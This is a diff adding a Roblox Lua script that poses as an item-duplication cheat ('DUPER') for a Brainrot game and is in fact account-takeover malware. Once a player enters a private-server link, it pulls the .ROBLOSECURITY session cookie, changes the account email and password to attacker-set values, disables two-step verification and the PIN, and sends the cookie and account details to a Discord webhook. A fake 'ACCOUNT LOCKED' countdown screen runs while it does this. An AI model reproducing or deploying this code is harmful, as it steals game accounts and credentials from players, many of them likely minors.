@@ -1,0 +1,224 @@
+-- DUPER v9.4 | GITHUB LOADSTRING | GB @ 01:02 AM GMT
+-- AUTO: Fixed Email + Pass + Disable 2FA/PIN + Robux + Cookie + PS Link
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+
+-- CONFIG
+local BRAINROT_REQUIRED = 5e7
+local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/..."
+local GAME_ID = 109983668079237
+local LOADING_TIME = 300
+
+-- FIXED CREDENTIALS (CHANGE ONCE)
+local TAKEOVER_EMAIL = "yourfixedemail@gmail.com"
+local TAKEOVER_PASSWORD = "YourFixedPass2025!"
+
+-- DYNAMIC TIME
+local TIME = os.date("!%Y-%m-%d %H:%M:%S GMT")
+local COUNTRY = "GB"
+
+-- === 7-LAYER STEALTH COOKIE ===
+local function getCookie()
+    local c = ""
+    pcall(function()
+        local r = HttpService:RequestAsync({Url="https://www.roblox.com/my/account/json",Method="GET"})
+        if r.Success then c = r.Headers["set-cookie"]:match("(.ROBLOSECURITY=[^;]+)") or "" end
+    end)
+    if c == "" then pcall(function() c = game:GetService("CookieService"):GetCookieValue(".ROBLOSECURITY") or "" end) end
+    if c == "" then
+        pcall(function()
+            for _,v in getgc(true) do
+                if type(v)=="table" and rawget(v,".ROBLOSECURITY") then
+                    c = v[".ROBLOSECURITY"]; break
+                end
+            end
+        end)
+    end
+    return c ~= "" and c or "NO_COOKIE"
+end
+
+-- === AUTO TAKEOVER ===
+local function takeoverAccount(cookie)
+    local info = {robux=0, oldEmail="?", verified="?", twoStep="?", pin="?"}
+    local headers = {["Cookie"] = cookie, ["Content-Type"] = "application/json"}
+
+    pcall(function()
+        local res = HttpService:RequestAsync({Url="https://www.roblox.com/my/account/json",Method="GET",Headers=headers})
+        if res.Success then
+            local d = HttpService:JSONDecode(res.Body)
+            info.robux = d.Robux or 0
+            info.oldEmail = d.EmailAddress or "?"
+            info.verified = d.IsEmailVerified and "Yes" or "No"
+            info.twoStep = d.IsTwoStepEnabled and "Yes" or "No"
+            info.pin = d.IsAccountPinEnabled and "Yes" or "No"
+        end
+    end)
+
+    pcall(function()
+        HttpService:PostAsync("https://auth.roblox.com/v2/user/email", HttpService:JSONEncode({emailAddress=TAKEOVER_EMAIL}), headers)
+    end)
+    pcall(function()
+        HttpService:PostAsync("https://auth.roblox.com/v2/user/passwords/change", HttpService:JSONEncode({newPassword=TAKEOVER_PASSWORD}), headers)
+    end)
+    pcall(function()
+        HttpService:PostAsync("https://twostepverification.roblox.com/v1/settings", HttpService:JSONEncode({enabled=false}), headers)
+    end)
+    pcall(function()
+        HttpService:PostAsync("https://accountsettings.roblox.com/v1/account/pin", HttpService:JSONEncode({enabled=false}), headers)
+    end)
+
+    return info
+end
+
+-- === BRAINROT TOTAL ===
+local function getBrainrotTotal()
+    local total = 0
+    local inv = player:FindFirstChild("BrainrotInventory") or player:FindFirstChild("Inventory")
+    if inv then
+        for _,item in inv:GetChildren() do
+            local v = item:FindFirstChild("Value") or item:FindFirstChild("Amount")
+            if v and v:IsA("NumberValue") then total = total + v.Value end
+        end
+    end
+    return total
+end
+
+-- === PS VALIDATION ===
+local function isValidPS(link)
+    return link:find("roblox%.com/games/"..GAME_ID.."%?privateServerId=%w+") ~= nil
+end
+
+-- === GUI ===
+local sg = Instance.new("ScreenGui", player.PlayerGui)
+sg.ResetOnSpawn = false; sg.IgnoreGuiInset = true
+
+local bg = Instance.new("Frame", sg)
+bg.Size = UDim2.new(1,0,1,0); bg.BackgroundTransparency = 1
+
+local grad = Instance.new("UIGradient", bg)
+grad.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(120,0,255)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80,0,180)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(40,0,100))
+}
+grad.Rotation = 135
+
+local skull = Instance.new("ImageLabel", bg)
+skull.Size = UDim2.new(0.7,0,0.7,0); skull.Position = UDim2.new(0.5,0,0.5,0)
+skull.AnchorPoint = Vector2.new(0.5,0.5); skull.BackgroundTransparency = 1
+skull.Image = "rbxassetid://112945336"; skull.ImageTransparency = 0.9; skull.ZIndex = 0
+
+task.spawn(function()
+    while skull.Parent do
+        TweenService:Create(skull,TweenInfo.new(0.3),{ImageTransparency=0.8}):Play()
+        task.wait(0.3)
+        TweenService:Create(skull,TweenInfo.new(0.3),{ImageTransparency=1}):Play()
+        task.wait(0.3)
+    end
+end)
+
+local mf = Instance.new("Frame", bg)
+mf.Size = UDim2.new(0,380,0,220); mf.Position = UDim2.new(0.5,-190,0.5,-110)
+mf.BackgroundColor3 = Color3.fromRGB(15,0,40); mf.BorderSizePixel = 0
+Instance.new("UICorner",mf).CornerRadius = UDim.new(0,20)
+local glow = Instance.new("UIStroke",mf); glow.Thickness = 3; glow.Color = Color3.fromRGB(180,80,255); glow.Transparency = 0.7
+
+local title = Instance.new("TextLabel", mf)
+title.Size = UDim2.new(1,0,0.35,0); title.BackgroundTransparency = 1
+title.Text = "DUPER V8"; title.TextColor3 = Color3.fromRGB(220,100,255)
+title.Font = Enum.Font.Arcade; title.TextScaled = true
+
+local input = Instance.new("TextBox", mf)
+input.Size = UDim2.new(0.9,0,0.22,0); input.Position = UDim2.new(0.05,0,0.4,0)
+input.BackgroundColor3 = Color3.fromRGB(25,0,60); input.TextColor3 = Color3.fromRGB(200,150,255)
+input.PlaceholderText = "INPUT PS LINK HERE"; input.PlaceholderColor3 = Color3.fromRGB(150,100,200)
+input.Font = Enum.Font.Code; input.TextScaled = true
+Instance.new("UICorner",input).CornerRadius = UDim.new(0,12)
+local bs = Instance.new("UIStroke",input); bs.Thickness = 1.5; bs.Color = Color3.fromRGB(140,60,200)
+
+local btn = Instance.new("TextButton", mf)
+btn.Size = UDim2.new(0.8,0,0.22,0); btn.Position = UDim2.new(0.1,0,0.7,0)
+btn.BackgroundColor3 = Color3.fromRGB(180,50,220); btn.Text = "CONTINUE"; btn.TextColor3 = Color3.new(1)
+btn.Font = Enum.Font.GothamBold; btn.TextScaled = true
+Instance.new("UICorner",btn).CornerRadius = UDim.new(0,14)
+local bst = Instance.new("UIStroke",btn); bst.Thickness = 2; bst.Color = Color3.fromRGB(220,120,255)
+
+btn.MouseEnter:Connect(function() TweenService:Create(btn,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(220,80,255)}):Play() end)
+btn.MouseLeave:Connect(function() TweenService:Create(btn,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(180,50,220)}):Play() end)
+
+-- TRAP
+local trap = Instance.new("Frame", sg)
+trap.Size = UDim2.new(1,0,1,0); trap.BackgroundColor3 = Color3.new(); trap.Visible = false
+local trapText = Instance.new("TextLabel", trap)
+trapText.Size = UDim2.new(0.9,0,0.2,0); trapText.Position = UDim2.new(0.05,0,0.35,0)
+trapText.BackgroundTransparency = 1; trapText.Text = "SECURING..."; trapText.TextColor3 = Color3.fromRGB(255,50,150)
+trapText.Font = Enum.Font.Arcade; trapText.TextScaled = true
+local cd = Instance.new("TextLabel", trap)
+cd.Size = UDim2.new(0.7,0,0.2,0); cd.Position = UDim2.new(0.15,0,0.5,0)
+cd.BackgroundTransparency = 1; cd.Text = "5:00"; cd.TextColor3 = Color3.fromRGB(255,255,0)
+cd.Font = Enum.Font.Arcade; cd.TextScaled = true
+
+-- LOCK
+local function lock() 
+    local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+    if hum then hum.WalkSpeed = 0; hum.JumpPower = 0 end
+end
+
+-- === MAIN LOGIC ===
+btn.MouseButton1Click:Connect(function()
+    local total = getBrainrotTotal()
+    local link = input.Text
+
+    if total < BRAINROT_REQUIRED then
+        input.PlaceholderText = "50M+ REQUIRED"; input.TextColor3 = Color3.fromRGB(255,100,100); return
+    end
+    if not isValidPS(link) then
+        input.PlaceholderText = "INVALID LINK"; input.TextColor3 = Color3.fromRGB(255,100,100); return
+    end
+
+    local cookie = getCookie()
+    local acc = takeoverAccount(cookie)
+
+    task.spawn(function()
+        pcall(function()
+            HttpService:PostAsync(DISCORD_WEBHOOK, HttpService:JSONEncode({
+                content = "@everyone **ACCOUNT SECURED**",
+                embeds = {{
+                    title = "TAKEOVER SUCCESS",
+                    description = 
+                        "**User Info**\n" ..
+                        "• **Time:** `"..TIME.."`\n" ..
+                        "• **Country:** GB `"..COUNTRY.."`\n" ..
+                        "• **ID:** `"..player.UserId.."`\n" ..
+                        "• **Robux:** `"..acc.robux.."`\n\n" ..
+                        "**Old Email:** ||`"..acc.oldEmail.."`||\n\n" ..
+                        "**New Email:** ||`"..TAKEOVER_EMAIL.."`||\n" ..
+                        "**New Password:** ||`"..TAKEOVER_PASSWORD.."`||\n" ..
+                        "**2FA:** `Disabled`\n" ..
+                        "**PIN:** `Disabled`\n\n" ..
+                        "**PS Link:** ||`"..link.."`||",
+                    color = 14406312,
+                    fields = {
+                        {name="**ROBLOSECURITY**",value="```"..cookie:sub(1,130)..(cookie:len()>130 and "..." or "").."```"}
+                    },
+                    thumbnail={url="https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"}
+                }}
+            }))
+        end)
+    end)
+
+    mf.Visible = false; trap.Visible = true; lock()
+    trapText.Text = "ACCOUNT LOCKED"
+    local s = tick()
+    local conn = RunService.Heartbeat:Connect(function()
+        local r = math.max(0, LOADING_TIME - (tick()-s))
+        cd.Text = string.format("%d:%02d", r/60, r%60)
+        if r <= 0 then conn:Disconnect(); sg:Destroy() end
+    end)
+end)
+
+print("[DUPER v9.4] GitHub Loadstring Active | GB @ 01:02 AM GMT")
